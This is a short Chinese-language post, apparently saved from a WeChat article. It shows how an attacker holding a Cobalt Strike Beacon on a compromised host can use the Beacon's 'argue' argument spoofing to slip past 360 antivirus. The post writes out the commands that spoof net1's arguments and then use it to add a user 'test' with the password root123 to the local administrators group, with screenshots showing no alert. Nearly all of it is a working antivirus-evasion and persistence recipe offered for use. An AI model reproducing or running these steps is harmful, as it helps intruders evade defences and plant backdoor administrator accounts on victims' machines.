> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247485469&idx=1&sn=1bd61a4e90d832b3282538a576e22bc7&chksm=eaad8820ddda0136bdb9d2d129c00449100e7ae444744869f166413a062670db254b4d99d9c1&scene=21#wechat_redirect)

在获取了对方主机 CobaltStrike Beacon 后，需要执行一些敏感的操作 (如创建用户等)。但是目标主机有 AV，执行敏感命令会直接报毒等，这时我们可以使用 Cobaltstrike 自带的 argue 参数污染来执行敏感操作。

使用 argue 参数污染创建新用户并加入管理员组中  

使用前提：administrator 或 system 权限。执行创建新用户命令，360 报毒

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c64ocPkSQTNElNicTicVGVU67ZoVx6EicumrAPOYv3GQPvXsgdXfKMyDWhjrGibic3iavN8fHwGic1WTnYQ/640?wx_fmt=png)

使用 argus 参数污染 net1  

```
#参数污染net1 
argue net1
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
#查看污染的参数 
argue
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c64ocPkSQTNElNicTicVGVU6BSDiadpbgL1bDxZJCWv9WkrA65WEY4lxKEbibKokSVkoGz5U7NtT9x2A/640?wx_fmt=png)

用污染的 net1 创建用户，发现创建成功，360 也不报毒  

```
#用污染的net1执行敏感操作
execute net1 user test root123 /add
execute net1 localgroup administrators test /add
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c64ocPkSQTNElNicTicVGVU6ial15hIHLscA0iclqpbW8HNG3keo5NmpTPpBsTmjxkPUibGaueqjdEhTA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c64ocPkSQTNElNicTicVGVU6e44IMbZQ1Gib3CzTf2QJiaPTLZHqI7Wfsofz05qQZrXWTgBRHicnH4Bdg/640?wx_fmt=png)